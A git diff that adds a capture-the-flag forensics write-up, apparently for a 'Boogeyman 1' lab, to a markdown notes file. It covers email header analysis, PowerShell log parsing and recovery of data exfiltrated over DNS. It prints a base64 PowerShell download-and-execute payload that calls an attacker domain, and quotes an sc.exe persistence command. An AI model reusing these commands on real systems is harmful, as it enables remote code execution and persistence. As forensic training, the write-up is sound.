@@ -2,7 +2,7 @@
 
 ## Table of Contents
 1. [Tempest](#tempest)
-
+2. [Boogeyman 1](#boogeyman-1)
 
 ## Tempest
 ### Preparation - Tools and Artifacts
@@ -237,3 +237,137 @@
     ![alt text](Assets/Tempest/11.png)
 
     This command remotely creates a persistent, automatic background service named "TempestUpdate" on the network computer "TEMPEST". When the system boots, it will automatically execute the file located at C:\ProgramData\final.exe with administrative privileges. The answer is `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto`.
+
+
+## Boogeyman 1
+### [Email Analysis] Look at that headers!
+1. What is the email address used to send the phishing email?
+
+    We can use `thunderbird` to analyze the email file. By checking the email headers, we can find the email address used to send the phishing email. The answer is `agriffin@bpakcaging.xyz`.
+
+2. What is the email address of the victim?
+
+    The answer is `julianne.westcott@hotmail.com`.
+
+3. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
+
+    We can check the DKIM-Signature and List-Unsubscribe headers by inspecting the `message source` in the email file. The answer is `elasticemail`.
+
+4. What is the name of the file inside the encrypted attachment?
+
+    We can download the attachment and unzip it with password `Invoice2023!`. We will find a file named `Invoice_20230103.lnk`. So, the answer is `Invoice_20230103.lnk`.
+
+5. What is the password of the encrypted attachment?
+
+    The answer is `Invoice2023!`.
+
+6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
+
+    We can use `lnkparse` tool to analyze the `Invoice_20230103.lnk` file. 
+
+    ```bash
+    lnkparse  Invoice_20230103.lnk
+    ```
+    Then, we can analyze the result. The answer is `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`.
+
+### [Endpoint Security] Are you sure that's an invoice?
+1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
+
+    We can use jq tool to analyze the powershell.json file and analyze the timestamp and script block text. By doing this, we can find the domains used by the attacker for file hosting and C2. 
+    
+    ```bash
+    cat powershell.json | jq -s '.[] | {Timestamp, ScriptBlockText}'
+    ```
+    The answer is `cdn.bpakcaging.xyz,files.bpakcaging.xyz`.
+
+2. What is the name of the enumeration tool downloaded by the attacker?
+
+    We can filter the output to find the command without `{` and `}`.
+
+    ```bash
+    cat powershell.json | jq -s '.[] | select(.ScriptBlockText != null and (.ScriptBlockText | startswith("{") | not)) | .ScriptBlockText'
+    ```
+    ![alt text](<Assets/Boogeyman 1/1.png>)
+
+    We can see that the attacker downloaded a tool named `Seatbelt`. In the next line, the attacker executed the tool with similar initial `sb` which also indicates that the tool is `Seatbelt` with the following common enumeration argument. And then, the attacke use the exact argument but using `seabelt.exe` instead of `sb` which indicates that the attacker execute the downloaded `seatbelt` tool. So, the answer is `seatbelt`.
+
+3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
+
+    We can trace the command with `cd` command that executed before `sq3.exe` in the powershell.json file. We can use this filter to sort by timestamp and find the relevant command:
+
+    ```bash
+    cat powershell.json | jq -s 'map(select(.ScriptBlockText != null and (.ScriptBlockText | startswith("{") | not))) | sort_by(.Timestamp) | .[] | .ScriptBlockText'
+    ```
+    ![alt text](<Assets/Boogeyman 1/2.png>)
+
+    The answer is `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`.
+
+4. What is the software that uses the file in Q3?
+
+    We can get the answer from the previous question. The file `plum.sqlite` is used by `Microsoft Sticky Notes`. So, the answer is `Microsoft Sticky Notes`.
+
+5. What is the name of the exfiltrated file?
+
+    We can see the indication of exfiltration in these lines:
+
+    ![alt text](<Assets/Boogeyman 1/3.png>)
+
+    The answer is `protected_data.kdbx`.
+
+6. What type of file uses the .kdbx file extension?
+
+    We can search the file extension `.kdbx` in the google and we will find that it is a `KeePass Database File`. So, the answer is `KeePass`.
+
+7. What is the encoding used during the exfiltration attempt of the sensitive file?
+
+    We can check the command used for exfiltration in the previous image. The answer is `hex`.
+
+8. What is the tool used for exfiltration?
+
+    The attacker is stealing a password database file (protected_data.kdbx) and sneaking the data out of the network by hiding it inside ordinary DNS queries (nslookup) sent to an IP address they control. So, the answer is `nslookup`.
+
+### [Network Traffic Analysis] They got us. Call the bank immediately!
+1. What software is used by the attacker to host its presumed file/payload server?
+
+    In the previous, i have found that the attacker used `files.bpakcaging.xyz` domain for file hosting. It used to host the `sq3.exe` binary. We can check the HTTP response header of the request to `files.bpakcaging.xyz` domain by using `wireshark` and use this filter:
+
+    ```txt
+    http.host contains "files.bpakcaging.xyz"
+    ```
+    We can find the relevant HTTP response and click `follow` > `HTTP Stream`. We can check the HTTP response header and find the software used by the attacker to host its presumed file/payload server. The answer is `python`.
+
+2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?
+
+    We can use this filter to find the relevant HTTP request to `cdn.bpakcaging.xyz` domain:
+
+    ```txt
+    http.host contains "cdn.bpakcaging.xyz"
+    ```
+    We can find check the `POST` and analyze it by follow http stream. We will found bunch of encoded data. We can decode it by using cyberchef and find the valid command output. So, the answer is `POST`.
+
+3. What is the protocol used during the exfiltration activity?
+
+    The answer is `DNS`.
+
+4. What is the password of the exfiltrated file?
+
+    We can filter to find HTTP that contains `sq3.exe`.
+
+    ```txt
+    http contains "sq3.exe"
+    ```
+    Then click follow > TCP Stream. Change the stream from `749` to `750`. We will many decimal numbers. We can copy all of it and use cyberchef to decode it. The answer is `%p9^3!lL^Mz47E2GaT^y`.
+
+5. What is the credit card number stored inside the exfiltrated file?
+
+    To solve this, we needed to preserve the exact time order (no sort) and strictly filter out the AWS internal junk. We used a regular expression (matches) to enforce that the string must start with hex characters and end exactly with .bpakcaging.xyz.
+
+    ```bash
+    tshark -r capture.pcapng -Y "dns.qry.name matches \"^[0-9A-Fa-f]+\\\\.bpakcaging\\\\.xyz$\"" -T fields -e dns.qry.name > chronological_chunks.txt
+    ```
+    With the chronological text isolated, we ran a final pipeline to remove consecutive duplicates, strip the domain names, and turn the hex characters back into a raw binary file.
+
+    ```bash
+    cat chronological_chunks.txt | uniq | cut -d'.' -f1 | tr -d '\n' | xxd -r -p > stolen_data.kdbx
+    ```
+    We can open the `stolen_data.kdbx` file with KeePass and use the password from the previous question to open it. We will find a credit card number in the entry. The answer is `4024007128269551`.
